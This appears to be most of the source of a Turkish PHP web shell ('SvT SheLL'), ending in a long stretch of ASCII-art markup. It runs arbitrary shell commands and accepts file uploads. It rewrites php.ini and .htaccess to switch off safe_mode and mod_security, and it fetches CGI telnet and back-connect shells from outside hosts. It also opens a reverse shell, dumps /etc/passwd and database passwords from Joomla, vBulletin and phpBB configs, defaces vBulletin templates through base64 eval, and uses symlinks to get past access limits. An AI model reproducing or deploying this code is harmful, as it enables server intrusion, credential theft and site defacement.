<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
<option value="ls -la /etc/virtual">ls -la /etc/virtual</option>
<option value="ls -la /etc/vdomainaliases">ls -la /etc/vdomainaliases</option>
<option value="ls -la /etc/vfilters">ls -la /etc/vfilters</option>
<option value="find PATH -perm 777 -type d">Yzilabilir Dizinler</option>
<option value="cat /etc/passwd | grep cpanel > 1;cat 1">p1</option>
<option value="cut -d: -f 6 1 >2;cat 2">p2</option>
</select> <input type="submit" value="Sonuc">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
if($_POST[baba]!= "") { $liz0=safeshell($_POST[baba]); }
if($_POST[liz0]!= "") { $liz0zim=safeshell($_POST[liz0]); }
$uid=safeshell('id');
$server=safeshell('uname -a');
echo "<pre><h4>";
echo "<b><font color=red>Bilgiler:</font></b>:$uid<br>";
echo "<b><font color=red>Server</font></b>:$server<br>";
echo "<b><font color=red>Komut Sonuclari:</font></b><br>"; 
if($_POST["baba"]!= "") { echo $liz0; }
if($_POST["liz0"]!= "") { echo $liz0zim; }
echo "</h4></pre>";
?>
<?php
}


//Perl cgi
function ecgi()
{

$kokdosya = ".htaccess";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
$metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .izocin

AddHandler cgi-script .izocin
AddHandler cgi-script .izocin";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya);

?>
<?php 

$file = fopen("izo.izocin" ,"w+"); 

$sa=file_get_contents('http://www.rohitab.com/cgiscripts/cgitelnet.txt'); 

$write = fwrite ($file ,$sa); 

fclose($file); 

if ($write) { 

echo "The File Was Created Successfuly.</br>"; 

} 
else {echo'"error"';} 

$chm = chmod("izo.izocin" , 0755); 

if ($chm == true){ 
    echo "chmoded the file to 755"; 
}else{ 
    echo "sorry file didn't chmoded"; 
} 
?>
<?php
}

//ln -s bypass
function elns()
{

$kokdosya = ".htaccess";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
$metin = "Options +FollowSymLinks
DirectoryIndex klasï¿½r adï¿½";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya);

}

//Apachi Bypass
function eapachi()
{

$kokdosya = ".htaccess";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
$metin = "AddType application/x-httpd-php4 .php";	
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
	

}


//izocin Bypass
function eizbypass()
{

?>
<?php
$mode="cp1";//????????????.
if($_REQUEST['ali']!=$mode)
{
   echo "<iframe src=cp1 width=100% height=100% frameborder=0></iframe> ";
exit;
}
?>

<?php

$mip = $_SERVER['REMOTE_ADDR'];

echo "      <hr><center>
            <form method='POST' action=''><br>  
            <input type='text' name='mip' size='25' value='$mip'>&nbsp; 
            <input type='text' name='bport' size='5' value='22'>&nbsp; 
            <input type='submit' value='Arkakapi'> 
            </form>"; 
         $mip=$_POST['mip']; 
         $bport=$_POST['bport']; 
         if ($mip <> "") 
         { 
         $fp=fsockopen($mip , $bport , $errno, $errstr); 
         if (!$fp){ 
               $result = "Error: could not open socket connection"; 
         } 
         else { 
         fputs ($fp ,"\n
#####################################################################

  ##   ##       #                       #      ###   ###   ###   ### 
  ##   ##       #                       #     #   # #   # #   # #   #
  # # # #  ###  ###  ###  #  #  #  ###  #         # #   # #   # #   #
  # # # # #   # #       # #  #  # #   # #        #  #   # #   # #   #
  #  #  # ##### #    #### # # # # #   # #       #   #   # #   #  ####
  #  #  # #     #   #   # # # # # #   # #      #    #   # #   #     #
  #     # #   # #   #   #  #   #  #   # #     #     #   # #   #    # 
  #     #  ###   ##  ####  #   #   ###  ####  #####  ###   ###   ##  

#####################################################################
whoami
root
:)\n\n"); 
      while(!feof($fp)){  
       fputs ($fp); 
       $result= fgets ($fp, 4096); 
      $message=`$result`; 
       fputs ($fp,"--> ".$message."\n"); 
      } 
      fclose ($fp); 
         } 
         } 
?> 
<hr>
<? 
$ip = $_SERVER['REMOTE_ADDR']; 
echo "IP Adresiniz: $ip";
?>
<hr></center></b>	
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<title>SvT SheLL - Mr.HiTman</title></head>
<style>
BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: #008080; }
a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
a:hover{color:#008080}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 12px; color: #dadada; font-family: Tahoma; border: 1px solid #666666;height:17}
textarea{background-color:#191919;color:#dadada;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #666666;}
div{font-size:12px;font-family:tahoma;font-weight:normal;color:whitesmoke}
select{background-color: #191919; font-size: 12px; color: #dadada; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style>
<table style="border: 2px solid rgb(218, 218, 218);" width="100%" bgcolor="#000000" height="%">
	<tr>
		<td><center><b><font color="white" face="tahoma" size="4">[ PriV8 ! ..
		izocin 2011 bypass edited SheLL ] </font></b></center></td>
	</tr>
</table>
<body bgcolor=#00000 text=white>
<p>&nbsp; </p>
</body><center>
<body bgcolor="#1A141A" background="http://vxx9.cc/vb/tar3q/black-css/d/bg.gif" lang=EN-US
</center>
<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
 <center>
 <?
 //phpinfo
if (empty($_POST['phpinfo'] )) {
	}else{
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo()";
	exit;
}
      // about
if  (empty($_POST['reno'] ) ) {
	}ELSE{
	$action = '?action=reno';
	echo "<table Width='100%' height='10%' bgcolor='#000000' border='1'><tr><td><center><font size='6' color='#FFFFFF'>
Red-Security Group Ailesi<br><br>
<br><br>
izleyici  <br><br>
www.redsecurity.iblogger.org<br><br><br><br><br><br><br>";


    echo "</font></center></td></tr></table> ";

	exit;
	}
   //sec bypass
if  (empty($_POST['sec'] ) ) {
	}ELSE{
	$action = '?action=sec';
echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions =
safe_mode_gid = OFF
open_basedir = OFF ");
echo "<b>Safe mode has been bypassed ..</b>";
echo ("<br>")
?>
<?
$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule> ");
echo "<b>Mode Security has been bypassed ..</b><br>";

  echo "<a href='javascript:history.back()'>Go Back To Shell</a>";
    echo "</font></center></td></tr></table> ";

	exit;
	}
   //sec bypass1
if  (empty($_POST['sec1'] ) ) {
	}ELSE{
	$action = '?action=sec1';
echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$file = fopen("as.gif" ,"w+"); 

$sa=file_get_contents('http://www.rohitab.com/cgiscripts/cgitelnet.txt'); 

$write = fwrite ($file ,$sa); 

fclose($file); 

if ($write) { 

echo "The File Was Created Successfuly.</br>"; 

} 
else {echo'"error"';} 

$chm = chmod("as.gif" , 0755); 

if ($chm == true){ 
    echo "chmoded the file to 755"; 
}else{ 
    echo "sorry file didn't chmoded"; 
} 
echo "<b>Safe mode has been bypassed ..</b>";
echo ("<br>")
?>
<?
$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"Options +FollowSymLinks
DirectoryIndex seees.html

AddType application/x-httpd-cgi .gif
AddHandler cgi-script .gif
AddHandler cgi-script .gif


Options FollowSymLinks MultiViews Indexes ExecCGI

Options +FollowSymLinks
DirectoryIndex seees.html
<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule> 
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit> ");
echo "<b>Cgi Shell Uploatedd ..</b><br>";
  echo "<a href='javascript:history.back()'>Go Back To Shell</a>";
    echo "</font></center></td></tr></table> ";

	exit;
	}
   //sec bypass2
if  (empty($_POST['sec2'] ) ) {
	}ELSE{
	$action = '?action=sec2';
echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$file = fopen("dc.php" ,"w+"); 

$sa=file_get_contents('http://adem.uprm.edu/acms/imagesup/11/dc.txt'); 

$write = fwrite ($file ,$sa); 

fclose($file); 

if ($write) { 

echo "The File Was Created Successfuly.</br>"; 

} 
else {echo'"error"';} 

$chm = chmod("dc.php" , 0755); 

if ($chm == true){ 
    echo "chmoded the file to 755"; 
}else{ 
    echo "sorry file didn't chmoded"; 
} 
echo "<b>BackcOnnect Yuklendi ..</b>";
echo ("<br>")
?>
<?

echo "<a href='dc.php'>Þimdi Baðlan</a>";
  echo "<a href='javascript:history.back()'>Go Back To Shell</a>";
    echo "</font></center></td></tr></table> ";

	exit;
	}
   //sec bypass3
if  (empty($_POST['sec3'] ) ) {
	}ELSE{
	$action = '?action=sec3';
echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("izossi.shtml","w+");
fwrite($fp,"<!--#exec cmd='swt' --> ");
echo "<b>Safe mode has been bypassed ..</b>";
echo ("<br>")
?>
<?

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"AddType text/html .shtml
AddOutputFilter INCLUDES .shtml ");
echo "<b>Mode Security has been bypassed ..</b><br>";


echo "<a href='lgs.php'>ssi shell týkla</a>";
  echo "<a href='javascript:history.back()'>Go Back To Shell</a>";
    echo "</font></center></td></tr></table> ";

	exit;
	}
             // php4
if  (empty($_POST['php4'] ) ) {
	}ELSE{
	$action = '?action=php4';
	echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";
    $r1s = fopen(".htaccess","w+");
fwrite($r1s,"<Files *.php>
   ForceType application/x-httpd-php4
</Files>");
echo "<b>PHP IS 4 Now ..</b><br>";

   echo "<a href='javascript:history.back()'>Go Back To Shell</a>";
    echo "</font></center></td></tr></table> ";

	exit;
	}
echo("<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'><INPUT type='submit'name='reno' value='About Me'  id=input><INPUT type='submit' name='phpinfo' value='PHPinfo' id=input><INPUT type='submit' name='sec' value='Bypass Safemode + mod sec' id=input><INPUT type='submit'name='sec1' value='Gif Cgi'  id=input><INPUT type='submit'name='sec2' value='Priv8 Backconnect'  id=input><INPUT type='submit'name='sec3' value='SSI '  id=input><INPUT type='submit' name='php4' value='Back PHP To 4' id=input></form>");
?>
</center>
  <hr>
<?
// Server info ..
echo "uname -a : "; echo (php_uname())
?>
<br>
<?php
$reno = (ini_get ("safe_mode"))  ;
if ($reno ==1)   {
echo "<font color=\"red\">Safe Mode : ON (secure)</font>";
} else {
echo "<font color=\"green\">Safe Mode : OFF (not secure)";
}
$r7e = @ini_get("open_basedir");
if ($r7e or strtolower($r7e) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$r7e."</font>";}
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
echo("<br>");
echo("Open base dir: $hopenbasedir");
echo("<br>");
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
echo("<br>");
echo "PHP Version : "; echo floatval(phpversion());
echo("<br>");
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo("<br>");
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo("<br>");
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
?>
<hr>
<br>
<font color="white">
<?
//Upload
if($_POST['dir'] == "") {

 $curdir = `pwd`;
} else {
 $curdir = $_POST['dir'];
}

if($_POST['svt'] == "") {

 $curcmd = "ls -la";
} else {
 $curcmd = $_POST['svt'];
}


?>
    <table><form method="post" enctype="multipart/form-data">
      <tr><td><b><span lang="ar-sa">Comand Line</span>:</b></td><td><input name="svt" type="text" size="100" value="<? echo $curcmd; ?>"></td><tr><td><b><span lang="ar-sa">Path</span>:</b></td><td><input name="dir" type="text" size="100" value="<? echo $curdir; ?>"></td><td><input name="exe" type="submit" value="Execute"></td></tr><tr><td><span lang="ar-sa"><b>Upload</b></span><b>:</b></td><td><input name="fila" type="file" size="100"></td><td><input name="upl" type="submit" value="Upload"></td></tr></form></table><pre><hr>
<font color="#FFFFFF"><?
    if(($_POST['upl']) == "Upload" ) {
    if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir."/".$_FILES['fila']['name'])) {
        echo "Uploaded ..<br><br>";
    } else {
        echo "There Is Something Wrong the file has not been uploaded ..";
    }
    }
    if(($_POST['exe']) == "Execute") {
     $curcmd = "cd ".$curdir.";".$curcmd;
     $f=popen($curcmd,"r");
     while (!feof($f)) {
      $buffer = fgets($f, 4096);
      $string .= $buffer;
     }
     pclose($f);
     echo htmlspecialchars($string);
    }
?>
<center>
<table style="border: 2px solid rgb(218, 218, 218);" width="100%" bgcolor="#000000" height="%">
	<tr>
		<td><center><font color="white" face="tahoma" size="4"><b>[ ConFig ReaDer ]</b></font></center></td>
	</tr>
</table>
</font>
<?php
// Config ReaDer
print "<form method='POST'>\n";
print "<input type='text' value='/home/user/vb/includes/config.php' size='85' name='t0v'/><br>\n";
print "<br><input type='submit' value='Read' name='Read'/>\n";
if(!empty($_POST['t0v'])){
include("{$_POST[t0v]}");
 print "<textarea cols='95' rows='30'>";
  if (class_exists('JConfig')) {
$t0v=new JConfig();
print " ===== Joomla =====";   print "\n";
print "host     = ".$t0v->host."\n";
print "db       = ".$t0v->db."\n";
print "user     = ".$t0v->user."\n";
print "password = ".$t0v->password."\n";
}elseif($config){
 print " ===== VB ===== ";    print "\n";
echo "Database : ".$config['Database']['dbname']."   ";
  print "\n";
echo "UserName : ".$config['MasterServer']['username']."   ";
  print "\n";
echo "Password : ".$config['MasterServer']['password']."   ";
  print "\n";
echo "E-mail : ".$config['Database']['technicalemail']."   ";
  print "\n";
echo "admincp-dir : ".$config['Misc']['admincpdir']."   ";
  print "\n";
echo "modcp-dir : ".$config['Misc']['modcpdir']."   ";
  print "\n";
}else{
 print " ===== PHPBB ===== ";      print "\n";
echo " Database : ".$dbname."   ";
  print "\n";
echo " Username : ".$dbuser."   ";
  print "\n";
echo " Password : ".$dbpasswd."   ";
  print "\n";
}
echo "</textarea>";
}

?>
<hr>
 <center>
<table style="border: 2px solid rgb(218, 218, 218);" width="100%" bgcolor="#000000" height="%">
	<tr>
		<td><center><font color="white" face="tahoma" size="4"><b>[ Vb InDeX ChaNgEr ]</b></font></center></td>
	</tr>
</table>
<?

if(empty($_POST['index'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"forum_vb\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"forum_vb\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"vb\" name=\"password\" type=\"password\"><br>
      <br>
<textarea name=\"index\" cols=\"70\" rows=\"30\">HaCkEd By Mr.HiTman</textarea><br>
<INPUT value=\"Set\" name=\"\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$index     = $_POST['index'];
         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$index=str_replace("\'","'",$index);

$set_index  = "{\${eval(base64_decode(\'";

$set_index .= base64_encode("echo \"$index\";");


$set_index .= "\'))}}{\${exit()}}</textarea>";

$ok=@mysql_query("UPDATE template SET template ='".$set_index."' WHERE title ='spacer_open'") or die(mysql_error());

if($ok){
echo "!! update finish !!<br><br>";
}

}
?>
<hr>
<head>
<meta http-equiv="Content-Language" content="en-us">
<style type="text/css">
.style1 {
	text-align: center;
	text-decoration: underline;
	color: #FFFFFF;
	font-size: large;
}
</style>
</head>
<br>
<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<center>
<table style="border: 2px solid rgb(218, 218, 218);" width="100%" bgcolor="#000000" height="%">
	<tr>
		<td><center><font color="white" face="tahoma" size="4"><b>[ Read By show_source & highlight_file ]</b></font></center></td>
	</tr>
</table>
</center>
<font color="white" face="tahoma" size="4">
<?php
//Read By show_source &  highlight_file
echo "<html>
</td></tr></table><form method='POST' enctype='multipart/form-data' >
</td></tr></table><form method='POST' enctype='multipart/form-data' >
<br>
<b>show_source  : </b><input type='text' name='show' value='' size='59' style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></p>
<b>highlight_file : </b><input type='text' name='high' value='' size='59' style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></p>
<input type='submit''  value='Read'  style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></form</p>
</form</p>";

if(empty($_POST['show']))
{
}
else
{
$s = $_POST['show'];
echo "<b><h1><font size='4' color='silver'>show_source</font></h1>";
$show = show_source($s);
}
if(empty($_POST['high']))
{
}
else
{
$h = $_POST['high'];
echo "<b><h1><font size='4' color='silver'>highlight_file</font></h1>";
echo "<br>";
$high = highlight_file($h);
}

echo eval(base64_decode($connection));
?>
<hr>
<br>
<style>
textarea{background-color:#191919;color:white;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1px solid #666666;}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 13px;font-weight:bold;color: white; font-family: Tahoma; border: 1px solid #666666;height:17}
</style>
</form>
    <div align=center id='n'><font face=tahoma size=2><b>
<form style="border: 1px ridge #FFFFFF">
<td width="50%"><font color=white>Read etc/passwd by posix_getpwuid</font></td>
<br>
    <td width="50%"><select size=\"1\" name="plugin"><option value="plugin">/etc/passwd</option></option></select></td>

<td width="100%" colspan="2">
    <p align="center"><input type="submit" value="Submit"></td>
    </form>
      <form style="border: 1px ridge #FFFFFF">
    <td width="50%"><font color=white>Read etc/valiases by system</font></td>

     <td width="50%"><select size="1" name="alias"><option value="alias">/etc/valiases</option></option></select></td>

<td width="100%" colspan="2">

    <p align="center"><input type="submit" value="Submit"></td>
  </tr>
  </form>
<?php
 // Read bye posix_getpwuid & system
   if ($_GET['alias'] )


      system('ls -al /etc/valiases');



 if ($_GET['plugin'] )

                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
?>
<form style="border: 1px ridge #FFFFFF">
<p align="center"><b><font size="4" color="#FFFFFF">Read By Symlink()</font></b></p>
     <p align="center">   <td width="50%"></td></p>
 <input type="text" name="r3n0" value="<?php $line=$_SERVER['DOCUMENT_ROOT']; echo $line . "/vb/includes/config.php"; ?>" size="59">
<tr>
    <td width="50%" colspan="2">
    <p align="center"><input type="submit" value="Submit"></td>
  </tr>
</form>
<?php
// Read By symlink
echo "</textarea>";

$k = $_GET['r3n0'];
$flib = "Mr.HiTman.txt";

if ($k == "") {
die;
}else{
@unlink($flib);
$sym = $k;
$link = getcwd() . "/" . $flib;
@symlink($sym, $link);
if ($k{0} == "/") {
echo "<script> window.location = '" . $flib . "'</script>";
}else{
echo "<pre><xmp>";
echo readlink($flib) . "\n";
echo "Filesize: " . linkinfo($flib) . "B\n\n";
$ddir = getcwd();
$file2 = str_replace($DOCUMENT_ROOT,'' , $ddir);
$file2 = "http://" . $SERVER_NAME . $filee . $flib;
$result = file_get_contents($file2); echo $result;
}
}

?>
<?PHP

}


//Symlink Nitrojen
function esysbypass()
{

?>
<?php
$mode="cp";//????????????.
if($_REQUEST['izo']!=$mode)
{
   echo "<iframe src=cp width=100% height=100% frameborder=0></iframe> ";
exit;
}
?>

<?PHP
###############################
#All Right Reserved By Sun-Army [ Sun-Army.Org]
#Coded By Nitr0jen26 -> nitr0jen26@asia.com
#Break Imperialism Back-Bone
#This Tool:
#1-Bypass Forbidden-403,Access Denied,You Dont Access And...In Symlink Method
#2-Bypass Php Safe-Mode Prior 5.2.12,5.3.1
#3-Support Cgi Bypass Methods
#Version = 1.0.2
###############################
session_start();
$Res = '';
if(is_writable(".")){
if(isset($_POST['file'])){
$file = $_POST['file'];
$fakedir="cx";
$fakedep=16;
if(!(isset($_SESSION['num']))){
$_SESSION['num'] = 0;
								}
else{
$_SESSION['num'] = $_SESSION['num'] + 1;
	}
$level=0;
@unlink("sun-".$_SESSION['num']);
@mkdir("sun-".$_SESSION['num']);
chdir("sun-".$_SESSION['num']);
for($as=0;$as<$fakedep;$as++){
if(!file_exists($fakedir))
mkdir($fakedir);
chdir($fakedir);
						}
while(1<$as--) chdir("..");
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
if(!empty($hardstyle[$a])){
if(!file_exists($hardstyle[$a]))
mkdir($hardstyle[$a]);
chdir($hardstyle[$a]);
$as++;
}
}
$as++;
while($as--)
chdir("..");
@rmdir("sun-fake");
@unlink("sun-fake");
@symlink(str_repeat($fakedir."/",$fakedep),"sun-fake");
if($_POST['type'] == 'file'){
while(1)
if(true==(@symlink("sun-fake/".str_repeat("../",$fakedep-1).$file,"index.html"))) break;
else $num++;
@unlink("sun-fake");
mkdir("sun-fake");
$Res = '<FONT COLOR="RED"><B> symlink <B><a href="./sun-'.$_SESSION['num'].'/">symlink'.$num.'</a> file</FONT>';
							}
else{
$fp = fopen(".htaccess",'a+');
$File = 'DirectoryIndex sun.htm';
fwrite($fp,$File);
while(1)
if(true==(@symlink("sun-fake/".str_repeat("../",$fakedep-1).$file,"sun"))) break;
else $num++;
@unlink("sun-fake");
mkdir("sun-fake");
$Res = '<FONT COLOR="RED"><a href="./sun-'.$_SESSION['num'].'/sun">Check It!'.$num.'</a></FONT>';
	}
							}
							}
				else{
$Res = '<FONT COLOR="RED">Cant Write In Directory!</Font>';				
					}
If (@ini_get("safe_mode") Or strtoupper(@ini_get("safe_mode")) == "on"){$Safe='<span style="color:red"><b>On</b></span>';}Else{$Safe='<span style="color:lime"><b>Off</b></span>';}					
?>
<Html>
<Head>
<Title>Sun Symlink Safe-Over [Apache]</Title>
</Head>
<Body bgcolor="black">
<Center>
<font size="-3">
<pre><font color=black>##################################################################################################################################</font><br><font color=black>##################################################################################################################################</font><br><font color=black>#####</font><font color=#0b0b00>#</font><font color=#303000>#</font><font color=#4f4f00>#</font><font color=#646400>#</font><font color=#6f6f00>#</font><font color=#737300>##</font><font color=#595900>#</font><font color=black>#####################################################################################################################</font><br><font color=black>###</font><font color=#181800>#</font><font color=olive>#</font><font color=#d1d100>#</font><font color=#e6e600>#</font><font color=#f1f100>#</font><font color=#f8f800>#</font><font color=#fcfc00>#</font><font color=#fefe00>#</font><font color=#fdfd00>#</font><font color=#e8e800>#</font><font color=#070700>#</font><font color=black>################</font><font color=#9a9a00>#</font><font color=#cccc00>#</font><font color=#cece00>##</font><font color=#c9c900>#</font><font color=#525200>#</font><font color=#030300>#</font><font color=black>#</font><font color=#131300>#</font><font color=#caca00>#</font><font color=#cece00>#</font><font color=#cdcd00>#</font><font color=#b9b900>#</font><font color=black>#########################</font><font color=#353500>#</font><font color=#bebe00>#</font><font color=#c9c900>#</font><font color=#cece00>##</font><font color=#cdcd00>#</font><font color=#c8c800>#</font><font color=#c2c200>#</font><font color=#b6b600>#</font><font color=#1d1d00>#</font><font color=black>####################################################</font><br><font color=black>##</font><font color=#121200>#</font><font color=#b6b600>#</font><font color=yellow>########</font><font color=#fefe00>#</font><font color=#242400>#</font><font color=black>################</font><font color=#cdcd00>#</font><font color=yellow>####</font><font color=#eeee00>#</font><font color=#505000>#</font><font color=black>#</font><font color=#1a1a00>#</font><font color=yellow>###</font><font color=#fdfd00>#</font><font color=black>#########################</font><font color=#a0a000>#</font><font color=yellow>########</font><font color=#686800>#</font><font color=black>####################################################</font><br><font color=black>##</font><font color=#939300>#</font><font color=#fefe00>#</font><font color=yellow>#########</font><font color=#565600>#</font><font color=black>##</font><font color=#434300>#</font><font color=#606000>#</font><font color=#666600>#</font><font color=#696900>####</font><font color=#1c1c00>#</font><font color=#4a4a00>#</font><font color=#8c8c00>#</font><font color=#909000>#</font><font color=#787800>#</font><font color=#0f0f00>#</font><font color=black>#</font><font color=#cdcd00>#</font><font color=yellow>#####</font><font color=#f2f200>#</font><font color=#5c5c00>#</font><font color=#1c1c00>#</font><font color=yellow>###</font><font color=#fdfd00>#</font><font color=black>########################</font><font color=#232300>#</font><font color=#f3f300>#</font><font color=yellow>########</font><font color=#c1c100>#</font><font color=#020200>#</font><font color=black>####</font><font color=#595900>#</font><font color=#969600>#</font><font color=#b7b700>#</font><font color=#d8d800>#</font><font color=#e1e100>#</font><font color=#e3e300>#</font><font color=#dfdf00>#</font><font color=#caca00>#</font><font color=#a3a300>#</font><font color=#6f6f00>#</font><font color=#3e3e00>#</font><font color=#141400>#</font><font color=black>####</font><font color=#797900>#</font><font color=#919100>#</font><font color=#8b8b00>#</font><font color=#6b6b00>#</font><font color=#2a2a00>#</font><font color=black>###</font><font color=#030300>#</font><font color=#555500>#</font><font color=#757500>#</font><font color=#8e8e00>#</font><font color=#929200>#</font><font color=#8d8d00>#</font><font color=#474700>#</font><font color=black>#</font><font color=#1e1e00>#</font><font color=#757500>#</font><font color=#838300>#</font><font color=#888800>#</font><font color=#8d8d00>#</font><font color=#919100>#</font><font color=#2d2d00>#</font><font color=black>#</font><font color=#606000>#</font><font color=#909000>#</font><font color=#8c8c00>#</font><font color=#878700>#</font><font color=olive>#</font><font color=#646400>#</font><font color=#050504>#</font><br><font color=black>##</font><font color=#e7e700>#</font><font color=yellow>########</font><font color=#fdfd00>#</font><font color=#fbfb00>#</font><font color=#828200>#</font><font color=black>##</font><font color=#dada00>#</font><font color=#fdfd00>#</font><font color=#fefe00>#</font><font color=yellow>####</font><font color=#444400>#</font><font color=#afaf00>#</font><font color=yellow>###</font><font color=#262600>#</font><font color=black>#</font><font color=#cdcd00>#</font><font color=yellow>######</font><font color=#eded00>#</font><font color=#6d6d00>#</font><font color=yellow>###</font><font color=#fdfd00>#</font><font color=black>########################</font><font color=#7b7b00>#</font><font color=yellow>#########</font><font color=#f5f500>#</font><font color=#1c1c00>#</font><font color=black>####</font><font color=#c2c200>#</font><font color=yellow>########</font><font color=#fefe00>#</font><font color=#eded00>#</font><font color=#bdbd00>#</font><font color=#545400>#</font><font color=#030300>#</font><font color=black>##</font><font color=#f6f600>#</font><font color=yellow>###</font><font color=#cece00>#</font><font color=#222200>#</font><font color=black>#</font><font color=#020200>#</font><font color=#646400>#</font><font color=#f5f500>#</font><font color=yellow>####</font><font color=#9f9f00>#</font><font color=black>#</font><font color=#191900>#</font><font color=#cfcf00>#</font><font color=yellow>####</font><font color=#aeae00>#</font><font color=#272700>#</font><font color=#e9e900>#</font><font color=yellow>###</font><font color=#fefe00>#</font><font color=#8e8e00>#</font><font color=#050505>#</font><br><font color=black>##</font><font color=#e3e300>#</font><font color=yellow>#######</font><font color=#eaea00>#</font><font color=#767600>#</font><font color=#4d4d00>#</font><font color=#323200>#</font><font color=black>##</font><font color=#e0e000>#</font><font color=yellow>######</font><font color=#3e3e00>#</font><font color=#b0b000>#</font><font color=yellow>##</font><font color=#fbfb00>#</font><font color=#212100>#</font><font color=black>#</font><font color=#cdcd00>#</font><font color=yellow>#######</font><font color=#fdfd00>#</font><font color=yellow>###</font><font color=#fdfd00>#</font><font color=black>#######################</font><font color=#0e0e00>#</font><font color=#e3e300>#</font><font color=yellow>##########</font><font color=#6d6d00>#</font><font color=black>####</font><font color=#a3a300>#</font><font color=yellow>###########</font><font color=#fefe00>#</font><font color=#999900>#</font><font color=#020200>#</font><font color=black>#</font><font color=#f6f600>#</font><font color=yellow>####</font><font color=#d8d800>#</font><font color=#2b2b00>#</font><font color=#666600>#</font><font color=#fafa00>#</font><font color=yellow>#####</font><font color=#9f9f00>#</font><font color=black>##</font><font color=#1f1f00>#</font><font color=#dddd00>#</font><font color=yellow>###</font><font color=#fefe00>#</font><font color=#d7d700>#</font><font color=yellow>####</font><font color=#a0a000>#</font><font color=#050500>#</font><font color=black>#</font><br><font color=black>##</font><font color=#7b7b00>#</font><font color=#fafa00>#</font><font color=yellow>######</font><font color=#d2d200>#</font><font color=#131300>#</font><font color=black>####</font><font color=#dada00>#</font><font color=yellow>######</font><font color=#383800>#</font><font color=#b0b000>#</font><font color=yellow>##</font><font color=#f4f400>#</font><font color=#171700>#</font><font color=black>#</font><font color=#cdcd00>#</font><font color=yellow>###########</font><font color=#fdfd00>#</font><font color=black>##</font><font color=#0a0a00>#</font><font color=#5e5e00>#</font><font color=#616100>##############</font><font color=#2a2a00>#</font><font color=black>####</font><font color=#5d5d00>#</font><font color=#fefe00>#</font><font color=yellow>##########</font><font 